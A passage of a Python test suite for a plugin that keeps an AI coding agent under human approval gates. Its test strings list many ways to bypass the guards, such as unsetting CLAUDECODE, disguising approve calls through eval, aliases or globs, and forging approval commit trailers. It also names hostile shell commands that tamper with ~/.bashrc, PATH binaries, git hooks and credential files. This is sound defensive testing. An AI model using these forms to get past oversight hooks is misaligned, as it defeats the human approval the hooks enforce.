"""Gate guards and hooks, driven through `bin/sdlc hook <event>` exactly as Claude Code calls them."""
import json
import unittest

from helpers import INTENT, PLAN, SPEC, RepoCase, git

from sdlc_engine import artifacts as A


class EditGuard(RepoCase):
    def edit(self, rel, content=None, old=None, new=None):
        path = str(self.root / rel)
        payload = self.hook_input("Write", file_path=path, content=content) if content is not None else \
            self.hook_input("Edit", file_path=path, old_string=old, new_string=new)
        return self.hook("pre-edit", payload)

    def assertBlocked(self, r, *needles):
        self.assertEqual(r.returncode, 2, r.stderr)
        for n in needles:
            self.assertIn(n, r.stderr)

    def test_code_is_read_only_until_plan_approved(self):
        self.assertBlocked(self.edit("src/app.py", "x = 2\n"), "G-LOCK-01", "Procedure:")
        self.write("intent", INTENT)
        self.approve("intent")
        self.write("spec", SPEC)
        self.approve("spec")
        self.write("plan", PLAN)
        self.assertBlocked(self.edit("src/app.py", "x = 2\n"), "state 3 PLAN", "Plan Approved 0001")
        self.approve("plan")
        self.assertEqual(self.edit("src/app.py", "x = 2\n").returncode, 0)

    def test_docs_and_outside_paths_stay_writable(self):
        self.assertEqual(self.edit("docs/notes.md", "n").returncode, 0)
        self.assertEqual(self.hook("pre-edit", self.hook_input("Write", file_path="/tmp/x.py", content="")).returncode, 0)

    def test_policy_files_not_exempt(self):
        self.write("intent", INTENT)                                   # state 1: read-only
        for rel in ("CLAUDE.md", "REVIEW.md", "skills/x/SKILL.md", "agents/x.md", "NOTES.md"):
            self.assertBlocked(self.edit(rel, "x"), "G-LOCK-01")
        for rel in ("README.md", "sub/README.md", "CHANGELOG.md", "CONTRIBUTING.md", "SECURITY.md", "docs/x.md"):
            self.assertEqual(self.edit(rel, "x").returncode, 0, rel)

    def test_agent_cannot_approve_by_editing(self):
        self.write("intent", INTENT)
        r = self.edit(".aiops/0001-csv-export/intent.md", old="status: Draft", new="status: Approved")
        self.assertBlocked(r, "G-GATE-05", "Intent Approved 0001")
        self.assertEqual(self.edit(".aiops/0001-csv-export/intent.md", old="Users cannot", new="Reps cannot")
                         .returncode, 0)

    def test_agent_cannot_touch_approval_stamp(self):
        self.write("intent", INTENT)
        self.approve("intent")
        text = (self.d / "intent.md").read_text()
        forged = A.set_fields(text, {"approved-by": "someone else"})
        self.assertBlocked(self.edit(".aiops/0001-csv-export/intent.md", forged), "approved-by")

    def test_artifacts_are_created_in_order_and_as_draft(self):
        self.assertBlocked(self.edit(".aiops/0001-csv-export/spec.md", SPEC.format(id="0001")),
                           "needs an approved intent.md")
        self.write("intent", INTENT)
        self.approve("intent")
        self.assertBlocked(self.edit(".aiops/0001-csv-export/spec.md",
                                     SPEC.format(id="0001").replace("status: Draft", "status: Approved")),
                           "must start as `status: Draft`")
        self.assertEqual(self.edit(".aiops/0001-csv-export/spec.md", SPEC.format(id="0001")).returncode, 0)

    def test_plan_and_review_also_wait_for_their_upstream_gate(self):
        self.write("intent", INTENT)
        self.approve("intent")
        self.write("spec", SPEC)
        self.assertBlocked(self.edit(".aiops/0001-csv-export/plan.md", PLAN.format(id="0001")),
                           "needs an approved spec.md")
        self.approve("spec")
        self.write("plan", PLAN)
        self.assertBlocked(self.edit(".aiops/0001-csv-export/review.md", "---\nid: 0001\n---\n"),
                           "needs an approved plan.md")

    def test_id_is_immutable(self):
        self.write("intent", INTENT)
        self.assertBlocked(self.edit(".aiops/0001-csv-export/intent.md", old="id: 0001", new="id: 0002"), "id")
        self.write("intent", INTENT)
        self.approve("intent")
        self.assertBlocked(self.edit(".aiops/0001-csv-export/spec.md", SPEC.format(id="0009")), "id")

    def test_guardrail_config_is_human_owned(self):
        self.assertBlocked(self.edit(".aiops/config/readonly-exempt", "src/*"), "human-owned")
        self.assertBlocked(self.edit(".aiops/state/test-lock", ""), "engine state")

    def test_uninitialized_repo_is_untouched(self):
        import shutil
        shutil.rmtree(self.root / ".aiops")
        self.assertEqual(self.edit("src/app.py", "x = 3\n").returncode, 0)


class BashGuard(RepoCase):
    def bash(self, command):
        return self.hook("pre-bash", self.hook_input("Bash", command=command))

    def blocked(self, command):
        r = self.bash(command)
        return r.returncode == 2

    def test_read_only_state_blocks_shell_writes_to_code(self):
        for cmd in ("echo 1 > src/app.py", "sed -i 's/1/2/' src/app.py", "tee src/new.py < /dev/null",
                    "cp README.md src/x.py", "rm src/app.py", "npm install left-pad", "python3 -m pip install x",
                    "git apply fix.patch", "git stash", "make format", "cd src && touch y.py"):
            self.assertTrue(self.blocked(cmd), cmd)

    def test_read_only_state_allows_reading_and_running(self):
        for cmd in ("ls -la > /dev/null 2>&1", "grep -rn x src | head", "make test", "git status", "git log -3",
                    "cat > /tmp/scratch.txt <<'EOF'\nx > src/app.py\nEOF", "echo hi >> docs/notes.md",
                    "git switch -c feat/0001-csv-export", "sdlc status", "python3 -c 'print(1)'"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_execution_state_unlocks_shell_writes(self):
        self.to_execution()
        self.assertFalse(self.blocked("echo 2 > src/app.py"))
        self.assertFalse(self.blocked("npm install left-pad"))

    def test_staging_code_is_blocked_while_locked(self):
        (self.root / "src" / "app.py").write_text("y\n")
        self.assertTrue(self.blocked("git add -A"))
        self.assertTrue(self.blocked("git add src/app.py"))
        self.assertFalse(self.blocked("git add .aiops/0001-csv-export/intent.md"))
        git(self.root, "add", "src/app.py")
        self.assertTrue(self.blocked("git commit -m wip"))

    def test_always_blocked_regardless_of_state(self):
        self.to_execution()
        for cmd in ("sdlc approve 0001 plan", "~/.claude/plugins/x/bin/sdlc hook prompt < f",
                    "python3 -c 'import sdlc_engine.approvals'", "git commit -m x -m 'AIOps-Approval: plan 0001'",
                    "sed -i 's/Draft/Approved/' .aiops/0001-csv-export/plan.md",
                    "echo 0001 > .aiops/state/active"):
            self.assertTrue(self.blocked(cmd), cmd)

    def test_heredoc_redirect_after_marker(self):
        for cmd in ("cat <<EOF > src/app.py\nx = 2\nEOF", "cat <<'EOF' >> src/app.py\nx\nEOF",
                    "cat <<-EOF > src/x.py\n\tx\n\tEOF", "tee src/a.py <<EOF\nx\nEOF"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("cat <<'EOF' > /tmp/scratch.txt\nx > src/app.py\nEOF", "grep -c x <<< 'a > src/b.py'"):
            self.assertFalse(self.blocked(cmd), cmd)
        self.to_execution()
        for cmd in ("cat <<'EOF' > .aiops/0001-csv-export/intent.md\nstatus: Approved\nEOF",
                    "cat <<EOF > .aiops/state/active\n0001\nEOF", "cat <<EOF > .aiops/config.json\n{}\nEOF"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.assertFalse(self.blocked("cat <<EOF > src/app.py\nx = 2\nEOF"))

    def test_heredoc_marker_in_arithmetic_or_ansi_c(self):
        for cmd in ("echo $((1<<EOF))\necho 1 > src/app.py", "(( x = 1<<EOF ))\necho 1 > src/app.py",
                    "echo $'a<<EOF'\necho 1 > src/app.py", "echo $'it\\'s <<EOF'\nrm src/app.py"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.to_execution()
        self.assertTrue(self.blocked("echo $((1<<EOF))\nrm -rf .aiops\nEOF"))
        for cmd in ("x=$((1<<2))\necho $x", "cat <<EOF > /tmp/x\n$((1<<2))\nEOF\necho ok"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_heredoc_marker_in_quotes_or_comment(self):
        for cmd in ("echo '<<EOF'\necho 1 > src/app.py", 'echo "x <<EOF"\nrm src/app.py',
                    "# <<EOF\nrm src/app.py", "echo hi # cat <<EOF\necho 1 > src/app.py"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.to_execution()
        self.assertTrue(self.blocked("echo '<<EOF'\nsed -i s/Draft/Approved/ .aiops/0001-csv-export/intent.md"))
        self.assertFalse(self.blocked("cat <<'EOF' > src/app.py\n# '<<X' not a marker\nEOF"))

    def test_more_write_forms_while_locked(self):
        for cmd in ("git commit src/app.py -m x", "git commit -m x -- src/app.py", "git -C src checkout app.py",
                    "cp -t src README.md", "cp --target-directory=src README.md", "find src -delete",
                    "find src -name x -exec rm {} +", "awk -i inplace '{print}' src/app.py"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("find src -name '*.py'", "git -C src status", "awk '{print}' src/app.py",
                    "git commit -m 'msg with src/app.py in it'"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_minor_write_forms(self):
        for cmd in ("git --work-tree=src checkout app.py", "git --work-tree src checkout app.py",
                    "curl -o src/x https://example.com", "curl --output src/x https://example.com",
                    "curl -sSLo src/x https://example.com", "wget -O src/x https://example.com",
                    "wget --output-document=src/x https://example.com"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("curl -s https://example.com", "curl -o /tmp/x https://example.com", "wget -q -O - https://e.x"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_aiops_tree_is_protected(self):
        self.write("intent", INTENT)
        self.assertTrue(self.blocked("rm -r .aiops/0001-csv-export"))           # state 1
        self.to_execution()
        for cmd in ("rm -r .aiops", "mv .aiops x", "rm -r .aiops/0001-csv-export", "rmdir .aiops/state",
                    "cp -r .aiops/0001-csv-export .aiops/0002-copy", "git rm -r .aiops",
                    "git mv .aiops/0001-csv-export y", "cd .aiops && rm -r 0001-csv-export"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("cat .aiops/0001-csv-export/plan.md", "ls .aiops", "git add .aiops/0001-csv-export/plan.md"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_aiops_tree_is_protected_from_globs_and_find(self):
        self.to_execution()
        (self.root / ".aiops" / "state" / "test-lock").write_text("x")
        (self.root / "evil.patch").write_text("diff --git a/.aiops/0001-csv-export/plan.md b/.aiops/0001-csv-export/plan.md\n"
                                              "--- a/.aiops/0001-csv-export/plan.md\n+++ b/.aiops/0001-csv-export/plan.md\n")
        (self.root / "ok.patch").write_text("diff --git a/src/app.py b/src/app.py\n--- a/src/app.py\n+++ b/src/app.py\n")
        (self.root / "build").mkdir()
        for cmd in ("rm -rf .ai*", "rm -rf $PWD/.aiops", 'rm -rf "$(pwd)/.aiops"', "rm -rf ${PWD}/.aiops/state",
                    "cd .aiops && rm -rf *", "find . -name test-lock -delete", "find .aiops -delete",
                    "find . -path '*/.aiops/*' -exec rm {} +", "find . -delete", "tar -xf x.tar -C .aiops",
                    "git apply evil.patch", "git am evil.patch"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("find . -name '*.pyc' -delete", "rm -rf build/*", "tar -xf x.tar -C build", "git apply ok.patch",
                    "ls .ai*", "find .aiops -name '*.md'"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_aiops_integrity_remaining_forms(self):
        self.to_execution()
        (self.root / ".aiops" / "state" / "test-lock").write_text("x")
        (self.root / "tab.patch").write_text("--- a/.aiops/0001-csv-export/plan.md\t2026-01-01 00:00:00\n"
                                             "+++ b/.aiops/0001-csv-export/plan.md\t2026-01-01 00:00:00\n")
        (self.root / "p0.patch").write_text("--- .aiops/0001-csv-export/plan.md\n+++ .aiops/0001-csv-export/plan.md\n")
        (self.root / "rel.patch").write_text("--- a/plan.md\n+++ b/plan.md\n")
        (self.root / "ok.patch").write_text("--- a/src/app.py\n+++ b/src/app.py\n")
        (self.root / "build").mkdir()
        for cmd in ("git apply tab.patch", "git apply -p0 p0.patch", "patch -p0 < p0.patch", "patch -i tab.patch",
                    "git apply --directory=.aiops/0001-csv-export rel.patch", "patch -d .aiops/0001-csv-export < rel.patch",
                    "cat ok.patch | git apply", "git apply -", "git am < /dev/stdin", "cat ok.patch | patch -p1",
                    "tar -C .aiops -xf x.tar", "tar --extract -f x.tar --directory=.aiops/state", "tar xf x.tar -C .aiops",
                    "cd .aiops && tar -xf /tmp/x.tar", "unzip x.zip -d .aiops", "unzip -o x.zip -d .aiops/state",
                    "find . -iname TEST-LOCK -delete", "find . -ipath '*/.AIOPS/*' -delete",
                    "rm -rf {.aiops,x}", "rm -rf .aiops/{state,config}", "d=.aiops; rm -rf $d",
                    "d=.aiops/state && rm -rf ${d}/test-lock", "export d=.aiops; mv $d /tmp/a"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("git apply ok.patch", "patch -p1 < ok.patch", "git am --abort", "git apply --directory=src rel.patch",
                    "tar -C build -xf x.tar", "tar -C .aiops -cf /tmp/a.tar .", "tar -tf x.tar", "unzip x.zip -d build",
                    "find . -iname '*.PYC' -delete", "rm -rf {build,dist}", "d=build; rm -rf $d", "x=1; echo $x"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_review_round3_minor_forms(self):
        self.to_execution()
        (self.root / "cq.patch").write_text('--- "a/.aio\\160s/0001-csv-export/plan.md"\n'
                                            '+++ "b/.aio\\160s/0001-csv-export/plan.md"\n')
        (self.root / "build").mkdir()
        for cmd in ("git checkout main -- .github/workflows/aiops-gates.yml", "git restore -s main .claude/settings.json",
                    "tar -xf x.tar -C.aiops", "git apply cq.patch", "echo x >> /tmp/someone/.ssh/config",
                    "cp key /tmp/someone/.aws/credentials"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("git checkout HEAD~1 .github", "git config --path core.fsmonitor /tmp/x",
                    "git config -z core.editor /tmp/x"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("git checkout main -- src/app.py", "git restore src/app.py", "tar -xf x.tar -Cbuild",
                    "echo x >> /tmp/notes.txt"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_engine_cannot_be_disguised(self):
        self.to_execution()
        for cmd in ("env -u CLAUDECODE sdlc approve 0001 plan", "unset CLAUDECODE", "unset FOO CLAUDE_CODE_CHILD_SESSION",
                    "CLAUDECODE= bin/sdlc approve 0001 plan", "export CLAUDE_CODE_CHILD_SESSION=0",
                    "env -i PATH=/usr/bin make test", "sdl\\c approve 0001 plan", "\"sdlc\" approve 0001 plan",
                    "s=sdlc; $s approve 0001 plan", "$(which sdlc) hook prompt < f", "`which sdlc` close 0001",
                    "sdlc legacy-approvals --write", "python3 -c 'import sdlc_engine'"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("sdlc status", "sdlc validate --all", "git log --grep approve", "cat lib/sdlc_engine/guards.py",
                    "echo $HOME", "make test"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_shell_writes_respect_protected_paths(self):
        self.to_execution()
        wf = self.root / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "aiops-gates.yml").write_text("run: sdlc validate --all --ci\n")
        for cmd in ("sed -i s/validate/status/ .github/workflows/aiops-gates.yml", "cp x .claude/settings.json",
                    "echo {} > package-lock.json", "rm .github/workflows/deploy.yml", "echo X=1 > .env",
                    "tee secrets/token < /dev/null"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.assertFalse(self.blocked("echo x > src/app.py"))

    def test_signing_toolchain_is_guarded(self):
        from helpers import ROOT
        self.to_execution()
        engine = ROOT / "lib" / "sdlc_engine" / "approvals.py"            # the installed plugin's code
        for cmd in ("git config gpg.ssh.program /tmp/s", "git config --local user.signingkey /tmp/k.pub",
                    "git config --global gpg.format openpgp", "git config core.hooksPath /tmp/h",
                    "git config --replace-all gpg.ssh.allowedSignersFile x", "cp /tmp/h .git/hooks/post-commit",
                    "echo x >> .git/config", f"sed -i s/G/U/ {engine}", f"cp /tmp/x {ROOT}/hooks/guard-bash.sh",
                    "git config core.fsmonitor /tmp/x.sh", "git config core.attributesFile /tmp/a",
                    "git config filter.x.clean /tmp/x.sh", "git config include.path /tmp/inc",
                    "git config includeIf.gitdir:/x.path /tmp/inc", "git config set gpg.ssh.program /tmp/s",
                    "git config --file .git/config user.name x", "git config -f .git/config core.hooksPath /tmp/h",
                    "git config --type bool core.fsmonitor true", "git config -e", "git config edit"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("git config user.name", "git config --get gpg.format", "git config --list", "cat .git/config",
                    "git config user.email me@example.com", "git config get core.fsmonitor",
                    "git config -f /tmp/x.cfg a.b c", "git config --type bool --get core.filemode"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_engine_cannot_be_disguised_further(self):
        self.to_execution()
        for cmd in ("export -n CLAUDECODE CLAUDE_CODE_CHILD_SESSION; f(){ sdlc \"$@\"; }; f approve 0001 intent",
                    "export -n CLAUDECODE", "declare +x CLAUDECODE", "typeset +x CLAUDE_CODE_CHILD_SESSION",
                    "env - PATH=/usr/bin make test", "function g { sdlc \"$@\"; }; g approve 0001 plan",
                    "alias s=sdlc", "sdlc $(echo approve) 0001 intent", "x=approve; sdlc $x 0001 intent",
                    "sdlc ${X:-approve} 0001 intent", "${s}lc approve 0001 intent",
                    "echo approve 0001 intent | xargs sdlc", "cp bin/sdlc /tmp/s", "cp -r lib/sdlc_engine /tmp/e",
                    "cat bin/sdlc > /tmp/s", "git commit -m \"$(printf 'AIOps-%s: plan 0001' Approval)\"",
                    "git commit -m 'AIOps-Appro''val: plan 0001'"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("sdlc status 0001", "sdlc new my-thing", "cat bin/sdlc", "f(){ echo hi; }; f",
                    "x=1; echo $x", "export PATH=$PATH:/opt/bin"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_no_false_positives(self):
        self.to_execution()
        for cmd in ("echo $HOME close the door", '[ "$CLAUDECODE" = 1 ] && echo inside',
                    "git commit -m 'Close: AIOps-x Approval flow'", "echo $(date) approve later",
                    "test $CLAUDE_CODE_CHILD_SESSION = 1", "git log --grep AIOps-Approval"):
            self.assertFalse(self.blocked(cmd), cmd)
        for cmd in ("s=sdlc; $s approve 0001 plan", "x=1 && ${s}lc close 0001", "sudo $s approve 0001 plan",
                    "echo $($s approve 0001 plan)", "CLAUDECODE= make test", "git commit -m 'AIOps-Approval : x'",
                    "git commit -m \"$(printf 'AIOps-%s: plan 0001' Approval)\""):
            self.assertTrue(self.blocked(cmd), cmd)

    def test_wrapped_engine_calls(self):
        self.to_execution()
        for cmd in ('eval "$s approve 0001 plan"', 'bash -c "$s approve 0001 plan"',
                    'sh -c "$(which sdlc) approve 0001 plan"', "nice $s approve 0001 plan",
                    "nice -n 5 $s approve 0001 plan", "timeout 5 $s approve 0001 plan",
                    "xargs -I{} $s approve 0001 plan", "! $s approve 0001 plan", "{ $s approve 0001 plan; }",
                    "env -u FOO $s approve 0001 plan", 'a=CLAUDE; eval "unset ${a}CODE ${a}_CODE_CHILD_SESSION"',
                    "export -n ${a}CODE", "env -u ${a}CODE make test", 'm=AIOps-Approval; git commit -m "$m: plan"'):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("echo $HOME close the door", "nice make test", "timeout 5 make check",
                    "export PATH=$PATH:/opt/bin", "unset FOO"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_engine_call_forms_round4(self):
        self.to_execution()
        for cmd in ("unset CLAUDE{CODE,_CODE_CHILD_SESSION}", "unset CLAUDE*", "export -n CLAUDE{CODE,}",
                    "env -u CLAUDE{CODE,} make test", "exec -c bash",
                    "eval \"$(printf 'unset CLAUDE%s CLAUDE_%s_CHILD_SESSION' CODE CODE)\"",
                    "s=sdlc; while $s approve 0001 plan; do break; done", "until $s approve 0001 plan; do :; done",
                    "coproc $s approve 0001 plan", "case x in x) $s approve 0001 plan;; esac",
                    "trap '$s approve 0001 plan' EXIT", "/bin/bash -c '$s approve 0001 plan'",
                    "busybox sh -c '$s approve 0001 plan'", "script -qc '$s approve 0001 plan' /dev/null",
                    "echo '$s approve 0001 plan' | bash", "source <(echo $s approve 0001 plan)",
                    "x=approve; $s $x 0001 plan", 'FOO="a b" $s approve 0001 plan', "bin/sdl? approve 0001 plan",
                    "bin/sdl[c] approve 0001 plan", "bin/sdl{c,} approve 0001 plan",
                    "python3 bin/sdl? approve 0001 plan"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ('git push -u origin "$(git branch --show-current)"', "git push -u origin $BRANCH", "sort -u $f",
                    "docker run -u $(id -u) img", "ps -u $USER", "python3 -u script.py $ARG",
                    "curl -u $USER:$TOKEN https://example.com", "declare -r X=$Y", "unset arr[$i]",
                    "sh scripts/x.sh $X hook", 'm=AIOps-x; echo "Approval"', "while true; do make test; break; done",
                    'for f in *.py; do echo "$f"; done', "$EDITOR notes.md"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_review_round5_forms(self):
        from helpers import ROOT
        self.to_execution()
        for cmd in ('$GIT commit -m "fix: close the file handle"', '"$VENV/bin/pytest" -k "hook or approve"',
                    "$PYTHON -m pytest -k hook", "$PYTHON manage.py approve 12", "npx tsc && $NODE dist/cli.js close",
                    "$(npm bin)/eslint --rule hook src", "git checkout -- .",
                    "git restore ."):
            self.assertFalse(self.blocked(cmd), cmd)
        # `timeout 30 $TEST_CMD close` has the exact shape of `timeout 5 $s approve`: blocked on purpose
        for cmd in ("timeout 30 $TEST_CMD close", "x=approve; $s $x 0001 plan", "s=sdlc; $s approve 0001 plan",
                    "git checkout HEAD~1 -- .",
                    "git restore --source=HEAD~1 .", "git checkout HEAD~1 -- ':/'", "git checkout HEAD~1 -- '*.yml'",
                    "git restore -s main ':(glob)**'", "cp /tmp/evil ~/.local/bin/python3", "echo x >> ~/.profile",
                    "echo x >> ~/.bashrc", "printf '[gpg]' >> ~/.config/git/config", "echo x >> ~/.gitconfig"):
            self.assertTrue(self.blocked(cmd), cmd)
        # pre-edit refuses the installed plugin even when the plugin isn't the project
        import shutil
        import tempfile
        other = tempfile.mkdtemp(dir=self.root.parent)
        try:
            shutil.copytree(self.root, other, dirs_exist_ok=True)
            payload = self.hook_input("Write", file_path=str(ROOT / "lib" / "sdlc_engine" / "approvals.py"), content="x")
            payload["cwd"] = other
            r = self.hook("pre-edit", payload, env={"CLAUDE_PROJECT_DIR": other})
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn("installed plugin", r.stderr)
        finally:
            shutil.rmtree(other)

    def test_review_round6_forms(self):
        import os
        self.to_execution()
        for cmd in ("cp /tmp/python3 ~/.local/bin/", "cp -t ~/.local/bin /tmp/python3", "mv /tmp/x ~/.local/bin",
                    "rsync /tmp/x ~/.local/bin/", "mv /tmp/x ~/bin", "cp x ~/.config/fish",
                    "echo x >> ~/.bash_aliases", "git checkout HEAD~1 .", 'sh "$(command -v sdlc)" approve 1 intent',
                    'set -- approve 0002 intent; $s "$@"', "$s ${a:-approve} 0001 plan"):
            self.assertTrue(self.blocked(cmd), cmd)
        # any user-writable directory on PATH outside the repo is part of the toolchain
        pathdir = self.root.parent / f"{self.root.name}.pathbin"
        pathdir.mkdir()
        saved = self.env["PATH"]
        self.env["PATH"] = f"{pathdir}{os.pathsep}{saved}"          # the hook subprocess sees this PATH
        try:
            self.assertTrue(self.blocked(f"cp /tmp/x {pathdir}/git"))
            link = self.root.parent / f"{self.root.name}.link"
            link.symlink_to(pathdir)
            self.assertTrue(self.blocked(f"cp /tmp/x {link}/python3"))
        finally:
            self.env["PATH"] = saved
        for cmd in ("cp /tmp/x $HOME/.local/bin/git", 'cp /tmp/x "$HOME"/.local/bin/git', "echo x >> $HOME/.bashrc",
                    "echo '[core]' >> ${HOME}/.gitconfig", "sed -i s/a/b/ ~/.bashrc", "sed -i s/a/b/ $HOME/.bashrc"):
            self.assertTrue(self.blocked(cmd), cmd)
        for cmd in ("cp x /tmp/y", "git checkout -- .", "git restore .", "git checkout feat/x", "mkdir -p build/bin",
                    "echo x > $HOME_DIR_NAME.txt"):
            self.assertFalse(self.blocked(cmd), cmd)

    def test_cd_is_tracked_when_resolving_targets(self):
        self.write("intent", INTENT)
        for cmd in ("cd src && sed -i s/Draft/Approved/ ../.aiops/0001-csv-export/intent.md",
                    "cd src && echo x > ../.aiops/0001-csv-export/intent.md",
                    "cd src; echo x > app.py"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.assertFalse(self.blocked("cd src && echo x > /dev/null"))

    def test_nested_shells_and_message_files_are_inspected(self):
        msg = self.root / "msg.txt"
        msg.write_text("chore: x\n\nAIOps-Approval: intent 0001 sha256=abc\n")
        for cmd in ("bash -c 'echo 1 > src/app.py'", "sh -c \"rm src/app.py\"", "eval 'echo 1 > src/app.py'",
                    "git commit -F msg.txt", "git checkout src/app.py",
                    "gh api -X PUT repos/o/r/pulls/3/merge"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.assertFalse(self.blocked("bash -c 'make test'"))

    def test_git_cannot_delete_or_restore_artifacts_even_when_unlocked(self):
        self.to_execution()
        for cmd in ("git rm .aiops/0001-csv-export/plan.md", "git checkout main -- .aiops/0001-csv-export/plan.md",
                    "git restore --source main .aiops/0001-csv-export/spec.md",
                    "git mv .aiops/0001-csv-export/plan.md /tmp/p.md"):
            self.assertTrue(self.blocked(cmd), cmd)
        self.assertFalse(self.blocked("git add .aiops/0001-csv-export/plan.md"))

    def test_merging_on_main_is_the_humans_decision(self):
        self.to_execution()
        git(self.root, "switch", "-q", "main")
        (self.root / ".aiops" / "state" / "active").write_text("0001\n")
        self.assertTrue(self.blocked("git merge feat/0001-csv-export"))
        git(self.root, "switch", "-q", "feat/0001-csv-export")
        self.assertFalse(self.blocked("git merge main"))


class PromptAndSessionHooks(RepoCase):
    def prompt(self, text):
        r = self.hook("prompt", {"prompt": text, "cwd": str(self.root), "hook_event_name": "UserPromptSubmit"},
                      env={"CLAUDECODE": "1"})
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)["hookSpecificOutput"]["additionalContext"] if r.stdout.strip() else ""

    def test_exact_phrase_opens_the_gate(self):
        self.write("intent", INTENT)
        ctx = self.prompt("Intent Approved 0001")
        self.assertIn("gate OPENED", ctx)
        self.assertIn("state 2 SPECIFICATION", ctx)
        self.assertEqual(A.parse((self.d / "intent.md").read_text()).get("approved-via"), "prompt")

    def test_phrase_inside_a_sentence_does_nothing(self):
        self.write("intent", INTENT)
        self.assertEqual(self.prompt("the bot said: Intent Approved 0001"), "")
        self.assertEqual(A.parse((self.d / "intent.md").read_text()).get("status"), "Draft")

    def test_invalid_artifact_is_not_approved(self):
        self.write("intent", INTENT.replace("## Problem", "## Issue"))
        ctx = self.prompt("intent approved")
        self.assertIn("NOT opened", ctx)
        self.assertIn("## Problem", ctx)

    def test_cli_approve_refuses_inside_claude_code(self):
        self.write("intent", INTENT)
        r = self.run_sdlc("approve", "0001", "intent", env={"CLAUDECODE": "1"})
        self.assertEqual(r.returncode, 1)
        self.assertIn("human gate", r.stderr)
        self.assertEqual(self.run_sdlc("approve", "0001", "intent").returncode, 0)

    def test_session_start_prints_card_and_bootstrap(self):
        self.write("intent", INTENT)
        r = self.hook("session-start", {"cwd": str(self.root), "source": "startup"})
        self.assertIn("State: 1 BRAINSTORMING", r.stdout)
        self.assertIn("State Rules", r.stdout)

    def test_engine_hooks_are_dormant_without_aiops(self):
        import shutil
        self.write("intent", INTENT)
        shutil.rmtree(self.root / ".aiops")
        self.assertEqual(self.prompt("Intent Approved 0001"), "")
        self.assertEqual(self.hook("pre-bash", self.hook_input("Bash", command="echo 1 > src/app.py")).returncode, 0)
        self.assertEqual(self.hook("post-edit", self.hook_input("Write", file_path=str(self.root / "x.md"))).returncode, 0)
        r = self.hook("session-start", {"cwd": str(self.root)})
        self.assertIn("not initialized", r.stdout)
        self.assertNotIn("State Rules", r.stdout)

    def test_post_edit_reports_schema_errors(self):
        self.write("intent", INTENT.replace("## Constraints", "## Limits"))
        r = self.hook("post-edit", self.hook_input("Write", file_path=str(self.d / "intent.md")))
        self.assertEqual(r.returncode, 2)
        self.assertIn("## Constraints", r.stderr)


class Ids(RepoCase):
    """Every Python guard block carries a registered rule id, a Procedure and the `sdlc why` pointer (0004 S2)."""
    BLOCK_RE = __import__("re").compile(r"^BLOCKED \[(G-[A-Z]+-\d\d)\] by zouj-ai-sdlc: ", __import__("re").M)

    def assertId(self, r, rid):
        from sdlc_engine import rules
        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
        m = self.BLOCK_RE.search(r.stderr)
        self.assertIsNotNone(m, r.stderr)
        self.assertEqual(m.group(1), rid, r.stderr)
        self.assertIn(rid, rules.load())
        self.assertIn("Procedure:", r.stderr)
        self.assertIn(f"sdlc why {rid}", r.stderr)

    def bash(self, cmd, cwd=None, env=None):
        payload = self.hook_input("Bash", command=cmd)
        if cwd:
            payload["cwd"] = str(cwd)
        return self.hook("pre-bash", payload, env=env)

    def edit(self, rel, content):
        return self.hook("pre-edit", self.hook_input("Write", file_path=str(self.root / rel), content=content))

    def test_python_blocks_carry_registered_id(self):
        from helpers import ROOT
        cases = [
            (lambda: self.edit("src/app.py", "x = 2\n"), "G-LOCK-01"),
            (lambda: self.edit(".aiops/config.json", "{}"), "G-ART-01"),
            (lambda: self.edit(".aiops/0001-csv-export/intent.md", INTENT.format(id="0002")), "G-ART-02"),
            (lambda: self.edit(".aiops/0001-csv-export/spec.md", SPEC.format(id="0001")), "G-GATE-01"),
            (lambda: self.edit(".aiops/0001-csv-export/intent.md",
                               INTENT.format(id="0001").replace("status: Draft", "status: Approved")), "G-GATE-02"),
            (lambda: self.hook("pre-edit", self.hook_input("Write", file_path=str(ROOT / "lib" / "x.py"),
                                                           content="")), "G-TOOL-01"),
            (lambda: self.bash("git commit -m x -m 'AIOps-Approval: plan 0001'"), "G-GATE-06"),
            (lambda: self.bash("CLAUDECODE= sdlc status"), "G-ENV-02"),
            (lambda: self.bash("sdlc approve 0001 plan"), "G-GATE-07"),
            (lambda: self.bash("echo x > src/app.py"), "G-LOCK-02"),
            (lambda: self.bash("rm -rf .aiops/0001-csv-export"), "G-ART-05"),
            (lambda: self.bash("find .aiops -name '*.md' -delete"), "G-ART-04"),
            (lambda: self.bash("eval eval eval eval true"), "G-BASH-01"),
            (lambda: self.bash("echo x > .git/config"), "G-TOOL-03"),
